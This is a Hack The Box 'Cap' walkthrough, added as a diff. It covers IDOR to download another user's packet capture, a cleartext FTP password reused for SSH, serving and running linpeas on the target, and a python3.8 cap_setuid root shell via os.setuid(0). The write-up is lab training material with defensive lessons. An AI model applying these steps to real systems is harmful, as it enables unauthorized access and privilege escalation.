@@ -1,0 +1,191 @@
+---
+title: "Cap"
+description: "HackTheBox Cap: IDOR on a security dashboard exposes other users' PCAP files, one capture leaks FTP credentials that work on SSH, and cap_setuid on python3.8 gives root."
+date: "2026-11-25"
+difficulty: "Easy"
+published: true
+---
+
+# Cap
+
+[Machine link](https://app.hackthebox.com/machines/Cap)
+
+> A Linux machine running an HTTP server whose "Security Snapshot" feature is vulnerable to IDOR and reveals sensitive information through the downloaded PCAP files.
+
+---
+
+## Machine Information
+
+| | |
+|---|---|
+| **Name** | Cap |
+| **Platform** | Hack The Box |
+| **Difficulty** | Easy |
+| **OS** | Linux (Ubuntu 20.04.2 LTS) |
+| **Attack vector** | IDOR on `/data/<id>` plus `cap_setuid` on `/usr/bin/python3.8` |
+
+---
+
+## Task 1: How many TCP ports are open?
+
+```bash
+nmap -sC -sV 10.129.92.2
+```
+
+![Nmap scan showing three open ports](/images/writeups/hackthebox/cap-nmap.png)
+
+```text
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Gunicorn
+|_http-title: Security Dashboard
+```
+
+**Answer:** `3` (FTP on 21, SSH on 22, HTTP on 80).
+
+---
+
+## Task 2: The path of a Security Snapshot
+
+After running a "Security Snapshot", the browser is redirected to `/data/3`. The path has the format `/[something]/[id]`, where `[id]` is the scan number.
+
+![Security Dashboard with the data scans in the sidebar](/images/writeups/hackthebox/cap-dashboard.png)
+
+**Answer:** `data`
+
+The `/data/3` page shows packet statistics and a Download button for the capture:
+
+![Statistics page for scan 3 at /data/3](/images/writeups/hackthebox/cap-data-page.png)
+
+---
+
+## Task 3: Other users' scans
+
+**Answer:** yes
+
+Changing the id in the URL returns other users' scans. The only valid ids are between 0 and 3.
+
+---
+
+## Task 4: The PCAP with sensitive data
+
+**Answer:** `0`
+
+Changing the id to `0` and inspecting the downloaded capture reveals credentials:
+
+```bash
+tcpdump -r 0.pcap
+```
+
+![tcpdump of 0.pcap showing FTP traffic](/images/writeups/hackthebox/cap-pcap-http.png)
+
+The capture contains an FTP login, including the password in clear text:
+
+![tcpdump output showing FTP USER nathan and the masked password](/images/writeups/hackthebox/cap-ftp-password.png)
+
+```text
+FTP: 220 (vsFTPd 3.0.3)
+FTP: USER nathan
+FTP: 331 Please specify the password.
+FTP: PASS Buck…RM3!
+FTP: 230 Login successful.
+```
+
+---
+
+## Task 5: Protocol carrying the sensitive data
+
+**Answer:** `ftp`
+
+The username and password are visible as plaintext FTP commands in the capture.
+
+---
+
+## Task 6: Password reuse
+
+**Answer:** `ssh`
+
+The FTP password also works for SSH. From the nmap scan, the three open TCP ports are 21 (FTP), 22 (SSH) and 80 (HTTP). Log in as `nathan` with the password recovered from the pcap:
+
+![SSH login as nathan](/images/writeups/hackthebox/cap-ssh-login.png)
+
+---
+
+## User Flag
+
+```text
+nathan@cap:~$ ls
+user.txt
+nathan@cap:~$ cat user.txt
+6dc0…f7f6
+```
+
+---
+
+## Task 8: Privilege escalation vector
+
+Download [linpeas](https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh) on your machine and serve it:
+
+```bash
+curl -O https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+ip addr
+# tun0: inet 10.10.14.173/23
+python3 -m http.server
+# Serving HTTP on 0.0.0.0 port 8000 ...
+```
+
+Fetch it on the target and make it executable:
+
+```bash
+nathan@cap:~$ wget http://10.10.14.173:8000/linpeas.sh
+nathan@cap:~$ chmod +x linpeas.sh
+nathan@cap:~$ ./linpeas.sh
+```
+
+![Running linpeas.sh on the target](/images/writeups/hackthebox/cap-linpeas.png)
+
+Under "Files with capabilities" linpeas lists:
+
+```text
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+```
+
+**Answer:** `/usr/bin/python3.8`
+
+---
+
+## Root Flag
+
+Use the `cap_setuid` capability to change the effective user ID to root and spawn a shell:
+
+```text
+nathan@cap:~$ python3
+Python 3.8.5 (default, Jan 27 2021, 15:41:15)
+[GCC 9.3.0] on linux
+>>> import os
+>>> os.setuid(0)
+>>> os.system('whoami')
+root
+>>> os.system('sh')
+# cd /root
+# ls
+root.txt  snap
+# cat root.txt
+6250…efb5
+```
+
+<div className="max-w-[420px] mx-auto">
+
+![You have solved Cap](/images/writeups/hackthebox/cap-solved.png)
+
+</div>
+
+---
+
+## Lessons Learned
+
+- **A predictable identifier is an authorization bug.** The `/data/<id>` endpoint served every scan to any logged-in user, and only four ids existed. IDOR does not need a complex payload when the object numbers are sequential.
+- **Packet captures are credential gold.** FTP sends credentials in clear text, so a single captured login gave us Nathan's password without any cracking.
+- **Users reuse passwords across services.** The FTP password worked verbatim for SSH, turning an information disclosure on a web app into a shell on the host.
+- **`cap_setuid` on an interpreter is root.** A file capability that lets a binary change its UID is effectively a privilege escalation primitive when that binary is Python. Linpeas found it in seconds; `os.setuid(0)` completed the box.
